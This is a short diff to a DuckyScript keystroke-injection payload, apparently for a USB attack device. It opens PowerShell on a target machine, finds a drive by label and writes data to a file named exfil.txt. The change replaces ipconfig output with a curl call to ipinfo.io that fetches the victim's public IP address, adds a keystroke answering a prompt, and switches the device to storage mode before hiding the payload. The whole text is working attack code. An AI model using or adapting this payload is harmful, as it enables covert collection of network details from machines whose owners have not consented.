@@ -55,9 +55,11 @@ GUI r
 DELAY 300
 STRINGLN Powershell
 DELAY 1000
-STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE Label='#DRIVELABEL'").DriveLetter; if ($driveLetter) { ipconfig | Out-File -Filepath "$driveLetter\exfil.txt" -Encoding utf8 }
+STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE Label='#DRIVELABEL'").DriveLetter; if ($driveLetter) { curl http://ipinfo.io/ip | Out-File -Filepath "$driveLetter\exfil.txt" -Encoding utf8 }
+DELAY 750
+STRINGLN A
 WAIT_FOR_STORAGE_ACTIVITY
 WAIT_FOR_STORAGE_INACTIVITY
 ALT F4
-ATTACKMODE OFF
+ATTACKMODE STORAGE
 HIDE_PAYLOAD
